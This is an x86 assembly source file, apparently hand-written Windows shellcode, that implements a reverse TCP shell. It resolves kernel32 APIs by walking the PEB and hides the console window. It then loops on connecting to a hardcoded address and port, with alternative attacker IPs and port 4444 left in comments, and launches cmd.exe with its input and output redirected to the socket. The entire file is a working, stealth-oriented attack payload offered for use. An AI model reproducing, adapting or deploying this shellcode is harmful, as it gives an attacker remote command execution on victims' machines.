section .text
global _start
_start:

; Written by Ay0uBN0uri


    ; find the kernel32.dll base address
        xor edx,edx
        mov eax, [fs: edx + 0x30]  ; EAX = PEB
        ; mov eax, fs:[edx + 0x30]  ; EAX = PEB
        mov eax, [eax + 0xc]      ; EAX = PEB->Ldr
        mov esi, [eax + 0x14]     ; ESI = PEB->Ldr.InMemoryOrderModuleList
        lodsd                     ; EAX = Second module (ntdll.dll) or like that mov eax,[esi]
        xchg eax, esi             ; EAX = ESI, ESI = EAX
        lodsd                     ; EAX = Third Module (kernel32)
        mov ebx, [eax + 0x10]     ; EBX = Base address of kernel32.dll
        
        


    ; find the export table of kernel32.dll 
        mov edx, [ebx + 0x3c] ; EDX = DOS->e_lfanew
        add edx, ebx          ; EDX = PE Header
        mov edx, [edx + 0x78] ; EDX = Offset export table
        add edx, ebx          ; EDX = Export table
        mov esi, [edx + 0x20] ; ESI = Offset names table
        add esi, ebx          ; ESI = Names table (address of AddressOfNames)
        xor ecx, ecx          ; ecx = 0


    ; get the GetProcAddress funcation name 
        Get_FunctionName:
        inc ecx                              ; Increment the ordinal
        lodsd                                ; Get name offset (remember lodsd will load to eax the content of the address point by esi and add to esi 0x4)
        add eax, ebx                         ; Get function name (remember ebx contains the address of kernel32.dll)
        cmp dword [eax], 0x50746547       ; GetP
        jnz Get_FunctionName
        cmp dword [eax + 0x4], 0x41636f72 ; rocA
        jnz Get_FunctionName
        cmp dword [eax + 0x8], 0x65726464 ; ddre
        jnz Get_FunctionName
    ; now eax contains the address to the string 'GetProcAddress'



    ; find the address of GetProcAddress 
        mov esi, [edx + 0x24]    ; ESI = Offset ordinals (remember edx contains the export table offset)
        add esi, ebx             ; ESI = Ordinals table (remember ebx contains the address of kernel32.dll)
        mov cx, [esi + ecx * 2]  ; CX = Number of function
        dec ecx
        mov esi, [edx + 0x1c]    ; ESI = Offset address table
        add esi, ebx             ; ESI = Address table
        mov edx, [esi + ecx * 4] ; EDX = Pointer(offset)
        add edx, ebx             ; EDX = GetProcAddress

        push ebx
        lea esi,[esp] ; save the address of kernel32.dll in the stack for future use
        mov [esi + 0x4], edx ; esi at offset 0x4 will now hold the address of GetProcAddress

    ; find the address of LoadLibraryA using GetProcAddress
        xor ecx,ecx
        push ebx ; save the address of kernel32.dll in the stack for future use ;)
        push edx ; save the address of GetProcAddress in the stack for future use ;)
        push ecx ; push some nulls
        push 0x41797261 ; Ayra
        push 0x7262694c ; rbiL
        push 0x64616f4c ; daoL
        push esp ; push the address point to LoadLibraryA string
        push ebx ; (remember ebx contains the address of kernel32.dll)
        call edx ; EDX = GetProcAddress

    ; now eax contains the address of LoadLibraryA
        mov [esi + 0x8], eax ; esi at offset 0x8 will now hold the address of LoadLibraryA

    ; Load ws2_32.dll using LoadLibraryA
        push 0x61616c6c ; aall
        sub word [esp+0x2],0x6161
        push 0x642e3233 ; d.23
        push 0x5f327377 ; _2sw
        push esp ; push the address point to ws2_32.dll string
        call eax ; call LoadLibraryA

        ; now eax contains the address of ws2_32.dll
        mov [esi + 0xc], eax ; esi at offset 0x4 will now hold the address of ws2_32.dll
    
    ; Load user32.dll using LoadLibraryA
        push 0x61616c6c ; aall
        sub word [esp + 0x2],0x6161
        push 0x642e3233 ; d.23
        push 0x72657375 ; resu
        push esp ; push the address point to user32.dll string
        call [esi + 0x8] ; call LoadLibraryA

        ; now eax contains the address of user32.dll
        mov [esi + 0x10], eax ; esi at offset 0x10 will now hold the address of user32.dll

    ; get the address of GetConsoleWindow using GetProcAddress
        mov ebx,[esi+0x4]; get from the stack the address of GetProcAddress (that we already saving it)
        xor ecx,ecx
        push ecx
        push 0x776f646e
        push 0x6957656c
        push 0x6f736e6f
        push 0x43746547
        push esp ; push the address point to GetConsoleWindow string
        mov eax,[esi]
        push eax ; push kernel32.dll address
        call ebx ; call GetProcAddress

        ; now eax contains the address of GetConsoleWindow
        mov [esi + 0x14], eax ; esi at offset 0x14 will now hold the address of GetConsoleWindow

    ; get the address of ShowWindow using GetProcAddress
        mov ebx,[esi+0x4]; get from the stack the address of GetProcAddress (that we already saving it)
        push 0x6161776f
        sub word [esp + 0x2],0x6161
        push 0x646e6957
        push 0x776f6853
        push esp ; push the address point to ShowWindow string
        mov eax,[esi + 0x10]
        push eax ; push user32.dll address
        call ebx ; call GetProcAddress

        ; now eax contains the address of ShowWindow
        mov [esi + 0x18], eax ; esi at offset 0x18 will now hold the address of ShowWindow

    ; get the address of WSAStartup using GetProcAddress
        mov ebx,[esi+0x4]; get from the stack the address of GetProcAddress (that we already saving it)
        push 0x61617075 ; aapu
        sub word [esp + 0x2],0x6161
        push 0x74726174 ; trat
        push 0x53415357 ; SASW
        push esp ; push the address point to WASStartup string
        mov eax,[esi+0xc]
        push eax ; push ws2_32.dll address
        call ebx ; call GetProcAddress

        ; now eax contains the address of WSAStartup
        mov [esi + 0x1c], eax ; esi at offset 0x1c will now hold the address of ws2_32.dll
    

    ; get the address of WSASocketA using GetProcAddress
        mov ebx,[esi+0x4]; get from the stack the address of GetProcAddress (that we already saving it)
        push 0x61614174 ; aaAt
        sub word [esp + 0x2],0x6161
        push 0x656b636f ; ekco
        push 0x53415357 ; SASW
        push esp ; push the address point to WSASocketA string
        mov eax,[esi+0xc]
        push eax ; push ws2_32.dll address
        call ebx ; call GetProcAddress

        ; now eax contains the address of WSASocketA
        mov [esi + 0x20], eax ; esi at offset 0x20 will now hold the address of WSASocketA

    ; get the address of connect using GetProcAddress
        mov ebx,[esi+0x4]; get from the stack the address of GetProcAddress (that we already saving it)
        push 0x61746365 ; atce
        sub byte [esp + 0x3],0x61
        push 0x6e6e6f63 ; nnoc
        push esp ; push the address point to connect string
        mov eax,[esi+0xc] ; mov ws2_32.dll address
        push eax ; push ws2_32.dll address
        call ebx ; call GetProcAddress

        ; now eax contains the address of connect
        mov [esi + 0x24], eax ; esi at offset 0x24 will now hold the address of connect


    ; get the address of CreateProcessA using GetProcAddress
        mov ebx,[esi+0x4]; get from the stack the address of GetProcAddress (that we already saving it)
        push 0x61614173 ; aaAs
        sub word [esp + 0x2],0x6161
        push 0x7365636f ; seco
        push 0x72506574 ; rPet
        push 0x61657243 ; aerC
        push esp ; push the address point to CreateProcessA string
        mov eax,[esi] ; mov kernel32.dll address
        push eax ; push kernel32.dll address
        call ebx ; call GetProcAddress

        ; now eax contains the address of CreateProcessA
        mov [esi + 0x28], eax ; esi at offset 0x28 will now hold the address of CreateProcessA


    ; get the address of ExitProcess using GetProcAddress
        mov ebx,[esi+0x4]; get from the stack the address of GetProcAddress (that we already saving it)
        push 0x61737365 ; asse
        sub byte [esp + 0x3],0x61
        push 0x636f7250 ; corP
        push 0x74697845 ; tixE
        push esp ; push the address point to ExitProcess string
        mov eax,[esi] ; mov kernel32.dll address
        push eax ; push kernel32.dll address
        call ebx ; call GetProcAddress

        ; now eax contains the address of ExitProcess
        mov [esi + 0x2c], eax ; esi at offset 0x2c will now hold the address of ExitProcess

    ; call GetConsoleWindow
        call [esi + 0x14]
        xor ecx,ecx
        push ecx
        push eax
        call [esi + 0x18]

    ; call WSAStartup ( WSAStartup(MAKEWORD(2,2),WSAData) )
        xor ecx,ecx
        mov cx,0x190
        sub esp,ecx ; to make space to WASData
        push esp ; push the address of WASData
        xor ecx,ecx
        mov cx,0x0202
        push ecx ; push the version of winsock (2.2)
        call dword [esi+0x1c] ; call WSAStartup


    ; call WSASocketA(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL)
    ; which is WSASocketA(2,1,6, NULL, NULL,NULL);
        xor ecx,ecx
        push ecx
        push ecx
        push ecx
        mov cl,0x6 ; IPPROTO_TCP
        push ecx
        xor ecx,ecx
        inc ecx
        push ecx ; SOCK_STREAM
        inc ecx
        push ecx ; AF_INET
        call dword [esi + 0x20]

        mov [esi + 0x30], eax ; esi at offset 0x20 will now hold the address of sock 

    again: 
    ; call connect
        mov eax,[esi + 0x30]
        ; push 0x6c01a8c0 ; sin_addr set to 192.168.1.108
        ; push 0x6401a8c0 ; sin_addr set to 192.168.1.100
        push 0x0101017f ; sin_addr set to 127.1.1.1
        ; push word 0x5c11 ; port = 4444
        push word 0xfa0c ; port = 3322
        ; push word 0x4e2f ; port = 20015
        xor ebx, ebx
        add bl, 0x2 ; AF_INET
        push word bx
        mov edx, esp
        push byte 16 ; size of sockaddr_in (0x10)
        push edx
        push eax ; push the sock
        xchg eax, edi
        call dword [esi + 0x24]
        xor ecx,ecx
        cmp eax,ecx
        jnz again
        

    ; CreateProcessA
    push 0x61646d63 ; "cmda"
    sub dword [esp + 0x3], 0x61 ; "cmd"
    mov edx, esp ; edx now pointer to our 'cmd' string

    ; set up the STARTUPINFO struct
    push edi
    push edi
    push edi ; we just put our SOCKET_FD into the arg params for HANDLE hStdInput; HANDLE hStdOutput; and HANDLE hStdError;
    xor ebx, ebx
    xor ecx, ecx
    add cl, 0x12
    
; we're going to throw 0x00000000 onto the stack 18 times, this will fill up both the STARTUPINFO and PROCESS_INFORMATION structs
; then we will retroactively fill them up with the arguments we need by using effective addressing relative to ESP like mov word [esp +]
looper:
    push ebx
    loop looper
    mov word [esp + 0x3c], 0x0101 ; set dwFlags arg in STARTUPINFO
    mov byte [esp + 0x10], 0x44 ; cb member of the struct set to 68 decimal, size of struct
    lea eax, [esp + 0x10] ; eax now a pointer to STARTUPINFO
; Actually Calling CreateProcessA now
    push esp ; pointer to PROCESS_INFORMATION
    push eax ; pointer to STARTUPINFO
    push ebx ; all NULLs
    push ebx
    push ebx
    inc ebx ; bInheritHandles == True
    push ebx
    dec ebx
    push ebx
    push ebx
    push edx ; pointer to 'cmd'
    push ebx
    call dword [esi + 0x28]
; call ExitProcess
    push ebx ; still null
    call dword [esi + 0x2c]
